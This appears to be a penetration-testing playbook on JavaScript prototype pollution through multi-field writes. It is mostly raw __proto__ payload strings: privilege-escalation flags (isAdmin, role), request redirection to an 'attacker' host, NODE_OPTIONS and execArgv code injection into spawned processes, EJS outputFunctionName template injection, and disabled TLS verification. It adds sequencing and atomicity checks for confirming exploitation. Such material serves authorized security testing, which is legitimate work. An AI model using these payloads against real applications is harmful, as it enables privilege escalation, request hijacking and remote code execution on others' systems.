# Multi-field writes — when one request pollutes several properties

A single merge call walks the whole source object — so one payload
can write many properties at once. When the sink needs a PAIR (an
enabled flag + a value, a host + a port, a name + a path), the
multi-field write is the atomic probe.

---

## 1. The pair-sink cases

```json
// the authz pair — a flag + an identity
{"__proto__":{"isAdmin":true,"role":"admin"}}
{"__proto__":{"verified":true,"email_verified":true}}
{"__proto__":{"active":true,"banned":false}}

// the request pair — a host + a path
{"__proto__":{"hostname":"attacker","path":"/x","port":80}}
{"__proto__":{"host":"attacker","url":"http://attacker/"}}
{"__proto__":{"baseURL":"http://attacker/","headers":{"X-A":"1"}}}

// the spawn pair — a command + its env
{"__proto__":{"shell":true,"env":{"PATH":"/tmp"}}}
{"__proto__":{"execPath":"/tmp/node","execArgv":["--eval","CODE"]}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x"},"cwd":"/tmp"}}

// the template pair — the option + the file it reads
{"__proto__":{"outputFunctionName":"x;CODE;var y","filename":"/tmp/x"}}
{"__proto__":{"basedir":"/tmp","name":"x.ejs"}}
{"__proto__":{"root":"/etc","views":["/etc"]}}

// the require pair — the path + the resolution
{"__proto__":{"main":"/tmp/x.js","paths":["/tmp/node_modules"]}}
{"__proto__":{"modulePath":"/tmp/x.js","dir":"/tmp"}}

// the python pair — a class attr + a global
{"__class__":{"is_admin":true},"__globals__":{"DEBUG":true}}
// (usually separate merges — python dicts don't nest these)
```

## 2. The "the sink checks two reads" pattern

```js
// a sink that reads TWO properties — pollute both atomically
if (user.isAdmin && user.role === 'admin') { ... }
{"__proto__":{"isAdmin":true,"role":"admin"}}

if (req.secure && req.hostname === trusted) { ... }
{"__proto__":{"secure":true,"hostname":"trusted.internal"}}

spawn(cmd, args) with opts.shell && opts.env.PATH
{"__proto__":{"shell":true,"env":{"PATH":"/tmp"}}}

render(tpl, {outputFunctionName, escapeFunction})
{"__proto__":{"outputFunctionName":"x;CODE;var y","escapeFunction":"id"}}
```

The single-payload pair is the correct probe — two separate
requests risk a partial write where only one lands.

## 3. The nested-multi — pollution inside a config tree

```json
{"__proto__":{"config":{"debug":true,"verbose":true,"dev":true}}}
{"__proto__":{"env":{"NODE_OPTIONS":"x","LD_PRELOAD":"y","PATH":"z"}}}
{"__proto__":{"session":{"admin":true,"role":"admin","level":9}}}
{"__proto__":{"opts":{"src":"x","href":"y","url":"z"}}}
{"__proto__":{"request":{"url":"x","headers":{"a":"b"}}}}
{"__proto__":{"template":{"outputFunctionName":"x","name":"y"}}}
{"__proto__":{"spawn":{"shell":true,"cwd":"/tmp"}}}
{"__proto__":{"tls":{"rejectUnauthorized":false,"servername":"x"}}}
```

The nested write puts the polluted name at `proto.config.debug` —
the sink must read `opts.config.debug` (two levels) — a polluted
NESTED property only lands if the sink's read path matches.

## 4. The "which combination does the sink need" table

| Sink grammar | The pair |
|---|---|
| `a && b` | both truthy |
| `a \|\| b` | either truthy |
| `a === X && b === Y` | exact-match pair |
| `o.x.y \|\| def` | nested x containing y |
| `spawn(cmd,{shell,env})` | shell:true + env obj |
| `require(name) with paths` | name + paths[] |
| `render(t,{opt,filename})` | opt + filename |
| `fetch(url,{headers})` | url + headers |
| `o.host:o.port` | host + port |
| `new Worker(f,{eval,workerData})` | eval:true + workerData |
| `user.isAdmin && user.role` | isAdmin + role |
| `req.secure && req.host` | secure + host |
| `cfg.debug && cfg.verbose` | debug + verbose |
| `x.y === 'admin'` | nested y=admin |

## 5. The "one write, two sinks" case

```json
{"__proto__":{"isAdmin":true}}
```

One write; two different reads — `GET /admin` checks `isAdmin`,
`GET /profile` shows `isAdmin` in the rendered user object. A
single pollution can fire multiple sinks — the readback sweep
should hit every endpoint that reads the polluted name, not just
the intended one.

## 6. The "write the whole object" payload

```json
{"__proto__":{
  "isAdmin":true,"role":"admin","level":9,"verified":true,
  "active":true,"debug":true,"verbose":true,
  "url":"http://attacker/","hostname":"attacker",
  "shell":true,"execPath":"/tmp/node",
  "env":{"NODE_OPTIONS":"--eval 'CODE'","PATH":"/tmp"},
  "outputFunctionName":"x;CODE;var y",
  "main":"/tmp/x.js","paths":["/tmp/node_modules"],
  "rejectUnauthorized":false,
  "secret":"x","key":"x"
}}
```

A broad write — many candidate names at once. Use ONLY after the
marker-write is confirmed and only for sink-DISCOVERY (which name
does a read pick up), never as the primary probe — a broad write
can crash the process if a shadowed built-in is among the names.

## 7. The sequencing — when the writes must be ordered

```js
// write1: pollute the "enable" flag
{"__proto__":{"featureX":true}}
// write2: pollute the value featureX reads
{"__proto__":{"featureXConfig":{"url":"http://attacker/"}}}
// read: GET /x → if (cfg.featureX) use(cfg.featureXConfig)
```

Two-step — the gate-flag first, confirm it opens the path, then
the payload-value. Same-request alternative: one payload with
both — `{"__proto__":{"featureX":true,"featureXConfig":{...}}}`.

## 8. The partial-write failure mode

```text
{"__proto__":{"a":1,"b":2}} sent → only 'a' polluted, 'b' missing
causes:
  - the merge short-circuits on the first key
  - 'b' hit a filter 'a' didn't
  - 'b' coerced to null and dropped
  - 'b' is a name the target already owns (own-prop wins)
```

Diagnose: send `{"__proto__":{"b":2}}` alone — if `b` lands solo,
the multi-write was truncated; if not, `b` is filtered/coerced.

## 9. The atomicity test

```bash
# one request, two markers, fresh-object readback for both
{"__proto__":{"ppa":"1","ppb":"2"}}
# readback: does ({}).ppa AND ({}).ppb both exist?
#   both → multi-write works — pair-sinks are reachable
#   only one → the merge truncates — split the pair across requests
#   neither → the write itself is dead — refute
```

## 10. The ledger

```bash
python3 tools/state.py <c> --hypothesis "multi-field: pair-sink isAdmin+role"
# refutes when: the merge truncates at one key; or the sink reads
# only one of the pair; or an own-prop on the target wins over
# the polluted fallback
```
